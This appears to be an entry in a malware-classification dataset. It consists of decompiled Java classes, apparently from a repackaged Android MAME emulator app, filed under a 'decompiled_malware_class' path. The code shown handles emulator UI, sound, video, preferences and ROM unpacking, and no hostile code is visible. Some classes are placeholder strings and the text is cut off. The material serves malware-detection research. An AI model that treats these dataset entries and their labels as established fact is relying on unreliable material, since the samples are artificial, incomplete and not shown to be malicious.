this.filterView=(FilterView)findViewById(com.mygame.ywbzhsi.R.id.FilterView); Bitmap bmp=BitmapFactory.decodeResource(getResources(),dwb_id); BitmapDrawable bitmapDrawable=new BitmapDrawable(bmp); bitmapDrawable.setTileModeXY(Shader.TileMode.REPEAT,Shader.TileMode.REPEAT); int alpha=0; if (type == 2) { alpha=130; }  else if (type == 3) { alpha=180; }  else if (type == 4) { alpha=100; }  else if (type == 5) { alpha=150; }  else if (type == 6) { alpha=50; }  else if (type == 7) { alpha=130; }  else if (type == 8) { alpha=50; }  else if (type == 9) { alpha=120; } bitmapDrawable.setAlpha(alpha); this.filterView.setBackgroundDrawable(bitmapDrawable); this.filterView.setMAME4all(this); } } this.emuView.setOnKeyListener(this.inputHandler); this.emuView.setOnTouchListener(this.inputHandler); this.inputView.setOnTouchListener(this.inputHandler); this.inputView.setOnKeyListener(this.inputHandler); this.mainHelper.updateMAME4all(); if (!Emulator.isEmulating()) { if (this.prefsHelper.getROMsDIR() == null) { String path=String.valueOf(getMainHelper().getDefaultROMsDIR()) + getPackageName() + ""/""; getMainHelper().ensureROMsDir(path); this.prefsHelper.setROMsDIR(path); runMAME4all(); return; } getMainHelper().ensureROMsDir(this.prefsHelper.getROMsDIR()); runMAME4all(); } } class AnonymousClass1 implements DialogInterface.OnClickListener { AnonymousClass1(){ } @Override public void onClick(DialogInterface dialog,int which){ Intent intent=new Intent(MAME4all.this,(Class<?>)WelcomScreen.class); MAME4all.this.startActivity(intent); MAME4all.this.finish(); } } class AnonymousClass2 implements DialogInterface.OnClickListener { AnonymousClass2(){ } @Override public void onClick(DialogInterface dialog,int which){ MAME4all.this.finish(); } } public void runMAME4all(){ getMainHelper().copyFiles(); Emulator.emulate(this.mainHelper.getLibDir(),this.prefsHelper.getROMsDIR()); } @Override protected void onActivityResult(int requestCode,int resultCode,Intent data){ super.onActivityResult(requestCode,resultCode,data); if (this.mainHelper != null) { this.mainHelper.activityResult(requestCode,resultCode,data); } } @Override protected void onResume(){ Log.d(""EMULATOR"",""onResume""); super.onResume(); if (this.prefsHelper != null) { this.prefsHelper.resume(); } if (DialogHelper.savedDialog != -1) { showDialog(DialogHelper.savedDialog); }  else if (!ControlCustomizer.isEnabled()) { Emulator.resume(); } if (this.inputHandler != null && this.inputHandler.getTiltSensor() != null) { this.inputHandler.getTiltSensor().enable(); } } @Override protected void onPause(){ Log.d(""EMULATOR"",""onPause""); super.onPause(); if (this.prefsHelper != null) { this.prefsHelper.pause(); } if (!ControlCustomizer.isEnabled()) { Emulator.pause(); } if (this.inputHandler != null && this.inputHandler.getTiltSensor() != null) { this.inputHandler.getTiltSensor().disable(); } if (this.dialogHelper != null) { this.dialogHelper.removeDialogs(); } } @Override protected void onStart(){ Log.d(""EMULATOR"",""onStart""); super.onStart(); } @Override protected void onStop(){ Log.d(""EMULATOR"",""onStop""); super.onStop(); } @Override protected Dialog onCreateDialog(int id){ Dialog d; return (this.dialogHelper == null || (d=this.dialogHelper.createDialog(id)) == null) ? super.onCreateDialog(id) : d; } @Override protected void onPrepareDialog(int id,Dialog dialog){ if (this.dialogHelper != null) { this.dialogHelper.prepareDialog(id,dialog); } } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.seleuco.mame4all\R.code","public final class R { public static final class attr {   } public static final class color {     public static final int black=0x7f050002;     public static final int emu_back_color=0x7f050000;     public static final int grey=0x7f050003;     public static final int red=0x7f050004;     public static final int white=0x7f050001;   } public static final class drawable {     public static final int back_portrait=0x7f020000;     public static final int bg=0x7f020001;     public static final int black=0x7f02003c;     public static final int border=0x7f020002;     public static final int btn1=0x7f020003;     public static final int btn2=0x7f020004;     public static final int btn3=0x7f020005;     public static final int btn_01=0x7f020006;     public static final int btn_02=0x7f020007;     public static final int btn_03=0x7f020008;     public static final int btn_1=0x7f020009;     public static final int btn_2=0x7f02000a;     public static final int btn_3=0x7f02000b;     public static final int button_a=0x7f02000c;     public static final int button_a_press=0x7f02000d;     public static final int button_b=0x7f02000e;     public static final int button_b_press=0x7f02000f;     public static final int button_l1=0x7f020010;     public static final int button_l1_press=0x7f020011;     public static final int button_l2=0x7f020012;     public static final int button_l2_press=0x7f020013;     public static final int button_r1=0x7f020014;     public static final int button_r1_press=0x7f020015;     public static final int button_r2=0x7f020016;     public static final int button_r2_press=0x7f020017;     public static final int button_select=0x7f020018;     public static final int button_select_press=0x7f020019;     public static final int button_start=0x7f02001a;     public static final int button_start_press=0x7f02001b;     public static final int button_x=0x7f02001c;     public static final int button_x_press=0x7f02001d;     public static final int button_y=0x7f02001e;     public static final int button_y_press=0x7f02001f;     public static final int crt_1=0x7f020020;     public static final int crt_2=0x7f020021;     public static final int directory_icon=0x7f020022;     public static final int directory_up=0x7f020023;     public static final int dpad_down=0x7f020024;     public static final int dpad_down_left=0x7f020025;     public static final int dpad_down_right=0x7f020026;     public static final int dpad_left=0x7f020027;     public static final int dpad_none=0x7f020028;     public static final int dpad_right=0x7f020029;     public static final int dpad_up=0x7f02002a;     public static final int dpad_up_left=0x7f02002b;     public static final int dpad_up_right=0x7f02002c;     public static final int file_icon=0x7f02002d;     public static final int icon=0x7f02002e;     public static final int scanline_1=0x7f02002f;     public static final int scanline_2=0x7f020030;     public static final int stick_down=0x7f020031;     public static final int stick_down_left=0x7f020032;     public static final int stick_down_right=0x7f020033;     public static final int stick_inner=0x7f020034;     public static final int stick_left=0x7f020035;     public static final int stick_none=0x7f020036;     public static final int stick_outer=0x7f020037;     public static final int stick_right=0x7f020038;     public static final int stick_up=0x7f020039;     public static final int stick_up_left=0x7f02003a;     public static final int stick_up_right=0x7f02003b;     public static final int translucent=0x7f02003d;     public static final int transparent=0x7f02003e;   } public static final class id {     public static final int ButtonContinue=0x7f080009;     public static final int EmulatorFrame=0x7f08000b;     public static final int EmulatorViewGL=0x7f080002;     public static final int EmulatorViewHW=0x7f080003;     public static final int EmulatorViewSW=0x7f080004;     public static final int FilterView=0x7f080005;     public static final int InputView=0x7f08000c;     public static final int LinearLayout01=0x7f080006;     public static final int ScrollView01=0x7f080007;     public static final int TextView01=0x7f080008;     public static final int ad_container=0x7f08000a;     public static final int seekbar=0x7f080001;     public static final int value=0x7f080000;   } public static final class layout {     public static final int bar=0x7f030000;     public static final int emuview_gl=0x7f030001;     public static final int emuview_hw=0x7f030002;     public static final int emuview_sw=0x7f030003;     public static final int filterview=0x7f030004;     public static final int help=0x7f030005;     public static final int home=0x7f030006;     public static final int main=0x7f030007;   } public static final class raw {     public static final int controller_landscape=0x7f040000;     public static final int roms=0x7f040001;   } public static final class string {     public static final int app_name=0x7f06000c;     public static final int gamepad_PDA=0x7f06000b;     public static final int menu_help=0x7f06000a;     public static final int menu_options=0x7f060007;     public static final int menu_quit=0x7f060009;     public static final int menu_quit_game=0x7f060008;     public static final int menu_vkey_A=0x7f060002;     public static final int menu_vkey_B=0x7f060003;     public static final int menu_vkey_MENU=0x7f060004;     public static final int menu_vkey_SELECT=0x7f060005;     public static final int menu_vkey_X=0x7f060000;     public static final int menu_vkey_Y=0x7f060001;     public static final int menu_vkeys=0x7f060006;     public static final int num=0x7f06000d;   } public static final class style {     public static final int ListText=0x7f070000;     public static final int ListTextSmall=0x7f070001;     public static final int Theme_MAME4ALL=0x7f070002;     public static final int Theme_MAME4ALL_TitleBar=0x7f070003;   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.seleuco.mame4all\raw.code","public static final class raw {   public static final int controller_landscape=0x7f040000;   public static final int roms=0x7f040001; } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.seleuco.mame4all\SoundThread.code","public class SoundThread implements Runnable {   protected AudioTrack audioTrack;   byte[] buff=new byte[11760];   int buff_size=0;   protected Thread t;   public void setAudioTrack(  AudioTrack audioTrack){     this.audioTrack=audioTrack;   }   public SoundThread(){     this.t=null;     this.t=new Thread(this,""sound-Thread"");     this.t.start();   }   @Override public void run(){     while (true) { synchronized (this) {         try {           wait();         }  catch (        InterruptedException e) {           e.printStackTrace();         }       }       if (this.audioTrack != null) {         this.audioTrack.write(this.buff,0,this.buff_size);       }     }   }   public synchronized void writeSample(  byte[] b,  int size){     System.arraycopy(b,0,this.buff,0,size);     this.buff_size=size;     notify();   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.seleuco.mame4all\string.code","public static final class string {   public static final int app_name=0x7f06000c;   public static final int gamepad_PDA=0x7f06000b;   public static final int menu_help=0x7f06000a;   public static final int menu_options=0x7f060007;   public static final int menu_quit=0x7f060009;   public static final int menu_quit_game=0x7f060008;   public static final int menu_vkey_A=0x7f060002;   public static final int menu_vkey_B=0x7f060003;   public static final int menu_vkey_MENU=0x7f060004;   public static final int menu_vkey_SELECT=0x7f060005;   public static final int menu_vkey_X=0x7f060000;   public static final int menu_vkey_Y=0x7f060001;   public static final int menu_vkeys=0x7f060006;   public static final int num=0x7f06000d; } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.seleuco.mame4all\style.code","public static final class style {   public static final int ListText=0x7f070000;   public static final int ListTextSmall=0x7f070001;   public static final int Theme_MAME4ALL=0x7f070002;   public static final int Theme_MAME4ALL_TitleBar=0x7f070003; } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.seleuco.mame4all\VideoThread.code","public class VideoThread implements Runnable {   protected long millis;   protected Thread thread=null;   protected int i=0;   protected int fps=0;   protected Canvas canvas=null;   protected boolean run=false;   protected MAME4all mm=null;   public void setMAME4all(  MAME4all mm){     this.mm=mm;   }   public void start(){     if (this.run) {       stop();     }     this.run=true;     if (this.thread == null) {       this.thread=new Thread(this,""video-Thread"");     }     this.thread.start();   }   public void stop(){     if (this.run) {       this.run=false; synchronized (this) {         notify();       }       try {         this.thread.join();       }  catch (      InterruptedException e) {         e.printStackTrace();       }       this.thread=null;     }   }   @Override public void run(){     while (this.run) {       try { synchronized (this) {           try {             if (this.run) {               wait();               if (!this.run) {                 return;               }             }  else {               return;             }           }  catch (          InterruptedException e) {             e.printStackTrace();           }         }         ByteBuffer bf=Emulator.getScreenBuffer();         Bitmap bmp=Emulator.getEmuBitmap();         if (bf != null && bmp != null) {           if (Emulator.getVideoRenderMode() == 4) {             bf.rewind();             bmp.copyPixelsFromBuffer(bf);             bmp.getPixels(Emulator.getScreenBuffPx(),0,Emulator.getEmulatedWidth(),0,0,Emulator.getEmulatedWidth(),Emulator.getEmulatedHeight());             this.mm.getEmuView().postInvalidate();           }  else {             this.canvas=Emulator.lockCanvas();             if (this.canvas != null) {               bf.rewind();               bmp.copyPixelsFromBuffer(bf);               this.i++;               this.canvas.concat(Emulator.getMatrix());               this.canvas.drawBitmap(bmp,0.0f,0.0f,Emulator.getEmuPaint());               if (Emulator.isDebug()) {                 this.canvas.drawText(""Threaded fps:"" + this.fps + "" w:""+ Emulator.getWindow_width()+ "" h:""+ Emulator.getWindow_height(),5.0f,40.0f,Emulator.getDebugPaint());                 if (System.currentTimeMillis() - this.millis >= 1000) {                   this.fps=this.i;                   this.i=0;                   this.millis=System.currentTimeMillis();                 }               }               Emulator.unlockCanvas(this.canvas);             }           }         }       }  catch (      Exception t) {         Log.getStackTraceString(t);       }     }   }   public synchronized void update(){     notify();   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.seleuco.mame4all\WelcomScreen.code","!org.eclipse.jdt.core.dom.TypeDeclaration@2322290e"
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.seleuco.mame4all.helpers\AnonymousClass11.code","class AnonymousClass11 implements DialogInterface.OnClickListener {   AnonymousClass11(){   }   @Override public void onClick(  DialogInterface dialog,  int item){ switch (item) { case 0:       DialogHelper.this.mm.getMainHelper().showHelp();     break; case 1:   DialogHelper.this.mm.getMainHelper().showSettings(); break; case 2: DialogHelper.this.mm.showDialog(6); break; case 3: Emulator.resume(); break; } DialogHelper.savedDialog=-1; DialogHelper.this.mm.removeDialog(5); } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.seleuco.mame4all.helpers\AnonymousClass12.code","class AnonymousClass12 implements DialogInterface.OnCancelListener {   AnonymousClass12(){   }   @Override public void onCancel(  DialogInterface dialog){     DialogHelper.savedDialog=-1;     Emulator.resume();     DialogHelper.this.mm.removeDialog(5);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.seleuco.mame4all.helpers\DialogHelper.code","!org.eclipse.jdt.core.dom.TypeDeclaration@3ae88456"
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.seleuco.mame4all.helpers\MainHelper.code","public class MainHelper {   public static final int BUFFER_SIZE=49152;   public static final String MAGIC_FILE=""dont-delete-00001.bin"";   public static final int SUBACTIVITY_HELP=2;   public static final int SUBACTIVITY_USER_PREFS=1;   protected MAME4all mm;   public MainHelper(  MAME4all value){     this.mm=null;     this.mm=value;   }   public String getLibDir(){     try {       String cache_dir=this.mm.getCacheDir().getCanonicalPath();       String lib_dir=cache_dir.replace(""cache"",""lib"");       return lib_dir;     }  catch (    Exception e) {       e.printStackTrace();       String lib_dir2=""/data/data/"" + this.mm.getPackageName() + ""/lib"";       return lib_dir2;     }   }   public String getDefaultROMsDIR(){     try {       String res_dir=String.valueOf(Environment.getExternalStorageDirectory().getCanonicalPath()) + ""/ROMs/"";       return res_dir;     }  catch (    IOException e) {       e.printStackTrace();       return ""/sdcard/ROMs/"";     }   }   public boolean ensureROMsDir(  String roms_dir){     File res_dir=new File(roms_dir);     if (!res_dir.exists() && !res_dir.mkdirs()) {       this.mm.getDialogHelper().setErrorMsg(""Can't find/create:\n '"" + roms_dir + ""'\nIs it writeable?"");       this.mm.showDialog(2);       return false;     }     String str_sav_dir=String.valueOf(roms_dir) + ""saves/"";     File sav_dir=new File(str_sav_dir);     if (!sav_dir.exists() && !sav_dir.mkdirs()) {       this.mm.getDialogHelper().setErrorMsg(""Can't find/create:\n'"" + str_sav_dir + ""'\nIs it writeable"");       this.mm.showDialog(2);       return false;     }     return true;   }   public void copyFiles(){     try {       String roms_dir=this.mm.getPrefsHelper().getROMsDIR();       File fm=new File(String.valueOf(roms_dir) + File.separator + ""saves/""+ MAGIC_FILE);       if (!fm.exists()) {         fm.createNewFile();         InputStream fis=this.mm.getResources().openRawResource(R.raw.roms);         ZipInputStream zis=new ZipInputStream(new BufferedInputStream(fis));         byte[] data=new byte[BUFFER_SIZE];         while (true) {           ZipEntry entry=zis.getNextEntry();           if (entry != null) {             if (!entry.isDirectory()) {               String destFN=String.valueOf(roms_dir) + File.separator + entry.getName();               FileOutputStream fos=new FileOutputStream(destFN);               BufferedOutputStream dest=new BufferedOutputStream(fos,BUFFER_SIZE);               while (true) {                 int count=zis.read(data,0,BUFFER_SIZE);                 if (count == -1) {                   break;                 }  else {                   dest.write(data,0,count);                 }               }               dest.flush();               dest.close();             }  else {               File f=new File(String.valueOf(roms_dir) + File.separator + entry.getName());               f.mkdirs();             }           }  else {             zis.close();             return;           }         }       }     }  catch (    Exception e) {       e.printStackTrace();     }   }   public int getscrOrientation(){     Display getOrient=this.mm.getWindowManager().getDefaultDisplay();     int orientation=this.mm.getResources().getConfiguration().orientation;     if (orientation == 0) {       Configuration config=this.mm.getResources().getConfiguration();       int orientation2=config.orientation;       if (orientation2 == 0 && getOrient.getWidth() != getOrient.getHeight() && getOrient.getWidth() >= getOrient.getHeight()) {         return 2;       }       return 2;     }     return 2;   }   public void reload(){     Intent intent=this.mm.getIntent();     this.mm.overridePendingTransition(0,0);     intent.addFlags(65536);     this.mm.finish();     this.mm.overridePendingTransition(0,0);     this.mm.startActivity(intent);   }   public boolean updateOverlayFilter(){     int type;     if (getscrOrientation() == 1) {       type=this.mm.getPrefsHelper().getPortraitOverlayFilterType();     }  else {       type=this.mm.getPrefsHelper().getLandscapeOverlayFilterType();     }     if (Emulator.getOverlayFilterType() != type) {       Emulator.setOverlayFilterType(type);       reload();       return true;     }     Emulator.setOverlayFilterType(type);     return false;   }   public boolean updateVideoRender(){     if (Emulator.getVideoRenderMode() != this.mm.getPrefsHelper().getVideoRenderMode()) {       Emulator.setVideoRenderMode(this.mm.getPrefsHelper().getVideoRenderMode());       reload();       return true;     }     Emulator.setVideoRenderMode(this.mm.getPrefsHelper().getVideoRenderMode());     return false;   }   public void setBorder(){     int size=this.mm.getResources().getConfiguration().screenLayout & 15;     if ((size == 3 || size == 4) && this.mm.getMainHelper().getscrOrientation() == 1) {       FrameLayout.LayoutParams lp=(FrameLayout.LayoutParams)this.mm.getEmuView().getLayoutParams();       View v=this.mm.findViewById(R.id.EmulatorFrame);       FrameLayout.LayoutParams lp2=null;       if (this.mm.getFilterView() != null) {         lp2=(FrameLayout.LayoutParams)this.mm.getFilterView().getLayoutParams();       }       if (this.mm.getPrefsHelper().isPortraitTouchController()) {         v.setBackgroundDrawable(this.mm.getResources().getDrawable(R.drawable.border));         lp.setMargins(15,15,15,15);         if (lp2 != null) {           lp2.setMargins(15,15,15,15);           return;         }         return;       }       v.setBackgroundDrawable(null);       v.setBackgroundColor(0);       lp.setMargins(0,0,0,0);       if (lp2 != null) {         lp2.setMargins(0,0,0,0);       }     }   }   public void updateMAME4all(){     int state;     if (!updateVideoRender() && !updateOverlayFilter()) {       View emuView=this.mm.getEmuView();       FilterView filterView=this.mm.getFilterView();       InputView inputView=this.mm.getInputView();       InputHandler inputHandler=this.mm.getInputHandler();       PrefsHelper prefsHelper=this.mm.getPrefsHelper();       String definedKeys=prefsHelper.getDefinedKeys();       String[] keys=definedKeys.split("":"");       for (int i=0; i < keys.length; i++) {         InputHandler.keyMapping[i]=Integer.valueOf(keys[i]).intValue();       }       Emulator.setValue(1,0);       Emulator.setValue(7,prefsHelper.isASMCores() ? 1 : 0);       Emulator.setValue(8,0);       Emulator.setDebug(false);       Emulator.setValue(10,prefsHelper.isIdleWait() ? 1 : 0);       Emulator.setThreadedSound(prefsHelper.isSoundfThreaded());       setBorder();       if (prefsHelper.isTiltSensor()) {         inputHandler.getTiltSensor().enable();       }  else {         inputHandler.getTiltSensor().disable();       }       inputHandler.setTrackballSensitivity(prefsHelper.getTrackballSensitivity());       inputHandler.setTrackballEnabled(!prefsHelper.isTrackballNoMove());       int state2=this.mm.getInputHandler().getInputHandlerState();       if (getscrOrientation() == 1) {         ((IEmuView)emuView).setScaleType(prefsHelper.getPortraitScaleMode());         if (filterView != null) {           filterView.setScaleType(this.mm.getPrefsHelper().getPortraitScaleMode());         }         Emulator.setFrameFiltering(prefsHelper.isPortraitBitmapFiltering());         if (state2 == 1 && !prefsHelper.isPortraitTouchController()) {           inputHandler.changeState();         }         if (state2 == 3 && prefsHelper.isPortraitTouchController()) {           inputHandler.changeState();         }         state=this.mm.getInputHandler().getInputHandlerState();         if (state == 3) {           inputView.setVisibility(8);         }  else {           inputView.setVisibility(0);         }         if (state == 1) {           inputView.setImageDrawable(this.mm.getResources().getDrawable(R.drawable.back_portrait));           inputHandler.readControllerValues(R.raw.controller_landscape);         }         if (ControlCustomizer.isEnabled()) {           ControlCustomizer.setEnabled(false);           this.mm.getDialogHelper().setInfoMsg(""Control layout customization is only allowed in landscape mode"");           this.mm.showDialog(3);         }       }  else {         ((IEmuView)emuView).setScaleType(this.mm.getPrefsHelper().getLandscapeScaleMode());         if (filterView != null) {           filterView.setScaleType(this.mm.getPrefsHelper().getLandscapeScaleMode());         }         Emulator.setFrameFiltering(this.mm.getPrefsHelper().isLandscapeBitmapFiltering());         if (state2 == 1 && !prefsHelper.isLandscapeTouchController()) {           inputHandler.changeState();         }         if (state2 == 3 && prefsHelper.isLandscapeTouchController()) {           inputHandler.changeState();         }         state=this.mm.getInputHandler().getInputHandlerState();         inputView.bringToFront();         if (state == 3) {           inputView.setVisibility(8);         }  else {           inputView.setVisibility(0);         }         if (state == 1) {           inputView.setImageDrawable(null);           inputHandler.readControllerValues(R.raw.controller_landscape);           if (ControlCustomizer.isEnabled()) {             this.mm.getEmuView().setVisibility(4);             this.mm.getInputView().requestFocus();           }         }  else         if (ControlCustomizer.isEnabled()) {           ControlCustomizer.setEnabled(false);           this.mm.getDialogHelper().setInfoMsg(""Control layout customization is only allowed when touch controller is visible"");           this.mm.showDialog(3);         }       }       int op=inputHandler.getOpacity();       if (op != -1 && state == 1) {         inputView.setAlpha(op);       }       inputView.requestLayout();       emuView.requestLayout();       if (filterView != null) {         filterView.requestLayout();       }       inputView.invalidate();       emuView.invalidate();       if (filterView != null) {         filterView.invalidate();       }     }   }   public void showWeb(){   }   public void showSettings(){   }   public void showHelp(){     Intent i2=new Intent(this.mm,(Class<?>)HelpActivity.class);     this.mm.startActivityForResult(i2,2);   }   public void activityResult(  int requestCode,  int resultCode,  Intent data){     if (requestCode == 1) {       updateMAME4all();     }   }   public ArrayList<Integer> measureWindow(  int widthMeasureSpec,  int heightMeasureSpec,  int scaleType){     int widthSize;     int heightSize;     int newHeight;     if (6 == 6) {       widthSize=View.MeasureSpec.getSize(widthMeasureSpec);       heightSize=View.MeasureSpec.getSize(heightMeasureSpec);     }  else {       int emu_w=Emulator.getEmulatedWidth();       int emu_h=Emulator.getEmulatedHeight();       if (6 == 2) {         emu_w=(int)(emu_w * 1.5f);         emu_h=(int)(emu_h * 1.5f);       }       if (6 == 3) {         emu_w*=2;         emu_h*=2;       }       if (6 == 4) {         emu_w=(int)(emu_w * 2.5f);         emu_h=(int)(emu_h * 2.5f);       }       int w=emu_w;       int h=emu_h;       int widthSize2=View.MeasureSpec.getSize(widthMeasureSpec);       int heightSize2=View.MeasureSpec.getSize(heightMeasureSpec);       if (heightSize2 == 0) {         heightSize2=1;       }       if (widthSize2 == 0) {         widthSize2=1;       }       float scale=1.0f;       if (6 == 5) {         scale=Math.min(widthSize2 / w,heightSize2 / h);       }       float desiredAspect=emu_w / emu_h;       widthSize=Math.min((int)(w * scale),widthSize2);       heightSize=Math.min((int)(h * scale),heightSize2);       float actualAspect=widthSize / heightSize;       if (Math.abs(actualAspect - desiredAspect) > 1.0E-7d) {         boolean done=false;         int newWidth=(int)(heightSize * desiredAspect);         if (newWidth <= widthSize) {           widthSize=newWidth;           done=true;         }         if (!done && (newHeight=(int)(widthSize / desiredAspect)) <= heightSize) {           heightSize=newHeight;         }       }     }     ArrayList<Integer> l=new ArrayList<>();     l.add(new Integer(widthSize));     l.add(new Integer(heightSize));     return l;   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.seleuco.mame4all.helpers\PrefsHelper.code","public class PrefsHelper implements SharedPreferences.OnSharedPreferenceChangeListener {   public static final int PREF_15X=2;   public static final int PREF_20X=3;   public static final int PREF_25X=4;   public static final String PREF_ANALOG_DZ=""PREF_ANALOG_DZ"";   public static final int PREF_ANALOG_FAST=2;   public static final int PREF_ANALOG_PRETTY=3;   public static final String PREF_ANIMATED_INPUT=""PREF_ANIMATED_INPUT"";   public static final String PREF_CONTROLLER_TYPE=""PREF_CONTROLLER_TYPE"";   public static final int PREF_CRT_1=4;   public static final int PREF_CRT_2=5;   public static final String PREF_DEFINED_CONTROL_LAYOUT=""PREF_DEFINED_CONTROL_LAYOUT"";   public static final String PREF_DEFINED_KEYS=""PREF_DEFINED_KEYS"";   public static final int PREF_DIGITAL=1;   public static final int PREF_FILTER_NONE=1;   public static final int PREF_FILTER_SCANLINE_1=2;   public static final int PREF_FILTER_SCANLINE_2=3;   public static final String PREF_GLOBAL_ASMCORES=""PREF_GLOBAL_ASMCORES"";   public static final String PREF_GLOBAL_DEBUG=""PREF_GLOBAL_DEBUG"";   public static final String PREF_GLOBAL_IDLE_WAIT=""PREF_GLOBAL_IDLE_WAIT"";   public static final String PREF_GLOBAL_SHOW_FPS=""PREF_GLOBAL_SHOW_FPS"";   public static final String PREF_GLOBAL_SHOW_INFOWARNINGS=""PREF_GLOBAL_SHOW_INFOWARNINGS"";   public static final String PREF_GLOBAL_SOUND_THREADED=""PREF_GLOBAL_SOUND_THREADED"";   public static final String PREF_GLOBAL_VIDEO_RENDER_MODE=""PREF_GLOBAL_VIDEO_RENDER_MODE"";   public static final int PREF_INPUT_DEFAULT=1;   public static final String PREF_INPUT_EXTERNAL=""PREF_INPUT_EXTERNAL"";   public static final int PREF_INPUT_ICADE=2;   public static final int PREF_INPUT_ICP=3;   public static final String PREF_LANDSCAPE_BITMAP_FILTERING=""PREF_LANDSCAPE_BITMAP_FILTERING"";   public static final String PREF_LANDSCAPE_CONTROLLER_TYPE=""PREF_LANDSCAPE_CONTROLLER_TYPE"";   public static final String PREF_LANDSCAPE_FILTER_TYPE=""PREF_LANDSCAPE_FILTER_2"";   public static final String PREF_LANDSCAPE_SCALING_MODE=""PREF_LANDSCAPE_SCALING_MODE_2"";   public static final String PREF_LANDSCAPE_TOUCH_CONTROLLER=""PREF_LANDSCAPE_TOUCH_CONTROLLER"";   public static final int PREF_ORIGINAL=1;   public static final String PREF_PORTRAIT_BITMAP_FILTERING=""PREF_PORTRAIT_BITMAP_FILTERING"";   public static final String PREF_PORTRAIT_FILTER_TYPE=""PREF_PORTRAIT_FILTER_2"";   public static final String PREF_PORTRAIT_SCALING_MODE=""PREF_PORTRAIT_SCALING_MODE_2"";   public static final String PREF_PORTRAIT_TOUCH_CONTROLLER=""PREF_PORTRAIT_TOUCH_CONTROLLER"";   public static final int PREF_RENDER_GL=3;   public static final int PREF_RENDER_HW=4;   public static final int PREF_RENDER_NORMAL=1;   public static final int PREF_RENDER_THREADED=2;   public static final String PREF_ROMsDIR=""PREF_ROMsDIR"";   public static final int PREF_SCALE=5;   public static final int PREF_STRETCH=6;   public static final String PREF_TILT_DZ=""PREF_TILT_DZ"";   public static final String PREF_TILT_SENSITIVITY=""PREF_TILT_SENSITIVITY"";   public static final String PREF_TILT_SENSOR=""PREF_TILT_SENSOR"";   public static final String PREF_TOUCH_DZ=""PREF_TOUCH_DZ"";   public static final String PREF_TRACKBALL_NOMOVE=""PREF_TRACKBALL_NOMOVE"";   public static final String PREF_TRACKBALL_SENSITIVITY=""PREF_TRACKBALL_SENSITIVITY"";   public static final String PREF_VIBRATE=""PREF_VIBRATE"";   protected MAME4all mm;   public PrefsHelper(  MAME4all value){     this.mm=null;     this.mm=value;   }   @Override public void onSharedPreferenceChanged(  SharedPreferences sharedPreferences,  String key){   }   public void resume(){     Context context=this.mm.getApplicationContext();     SharedPreferences prefs=PreferenceManager.getDefaultSharedPreferences(context);     prefs.registerOnSharedPreferenceChangeListener(this);   }   public void pause(){     Context context=this.mm.getApplicationContext();     SharedPreferences prefs=PreferenceManager.getDefaultSharedPreferences(context);     prefs.unregisterOnSharedPreferenceChangeListener(this);   }   protected SharedPreferences getSharedPreferences(){     Context context=this.mm.getApplicationContext();     return PreferenceManager.getDefaultSharedPreferences(context);   }   public int getPortraitScaleMode(){     return Integer.valueOf(getSharedPreferences().getString(PREF_PORTRAIT_SCALING_MODE,""5"")).intValue();   }   public int getLandscapeScaleMode(){     return Integer.valueOf(getSharedPreferences().getString(PREF_LANDSCAPE_SCALING_MODE,""5"")).intValue();   }   public int getPortraitOverlayFilterType(){     return Integer.valueOf(getSharedPreferences().getString(PREF_PORTRAIT_FILTER_TYPE,""1"")).intValue();   }   public int getLandscapeOverlayFilterType(){     return Integer.valueOf(getSharedPreferences().getString(PREF_LANDSCAPE_FILTER_TYPE,""1"")).intValue();   }   public boolean isPortraitTouchController(){     return getSharedPreferences().getBoolean(PREF_PORTRAIT_TOUCH_CONTROLLER,true);   }   public boolean isPortraitBitmapFiltering(){     return getSharedPreferences().getBoolean(PREF_PORTRAIT_BITMAP_FILTERING,false);   }   public boolean isLandscapeTouchController(){     return getSharedPreferences().getBoolean(PREF_LANDSCAPE_TOUCH_CONTROLLER,true);   }   public boolean isLandscapeBitmapFiltering(){     return getSharedPreferences().getBoolean(PREF_LANDSCAPE_BITMAP_FILTERING,false);   }   public String getDefinedKeys(){     SharedPreferences p=getSharedPreferences();     StringBuffer defaultKeys=new StringBuffer();     for (int i=0; i < InputHandler.defaultKeyMapping.length; i++) {       defaultKeys.append(String.valueOf(InputHandler.defaultKeyMapping[i]) + "":"");     }     return p.getString(PREF_DEFINED_KEYS,defaultKeys.toString());   }   public int getTrackballSensitivity(){     return getSharedPreferences().getInt(PREF_TRACKBALL_SENSITIVITY,3);   }   public boolean isTrackballNoMove(){     return getSharedPreferences().getBoolean(PREF_TRACKBALL_NOMOVE,false);   }   public int getVideoRenderMode(){     return Integer.valueOf(getSharedPreferences().getString(PREF_GLOBAL_VIDEO_RENDER_MODE,""2"")).intValue();   }   public boolean isSoundfThreaded(){     return getSharedPreferences().getBoolean(PREF_GLOBAL_SOUND_THREADED,true);   }   public boolean isFPSShowed(){     return getSharedPreferences().getBoolean(PREF_GLOBAL_SHOW_FPS,false);   }   public boolean isDebugEnabled(){     return getSharedPreferences().getBoolean(PREF_GLOBAL_DEBUG,false);   }   public boolean isIdleWait(){     return getSharedPreferences().getBoolean(PREF_GLOBAL_IDLE_WAIT,true);   }   public boolean isAnimatedInput(){     return 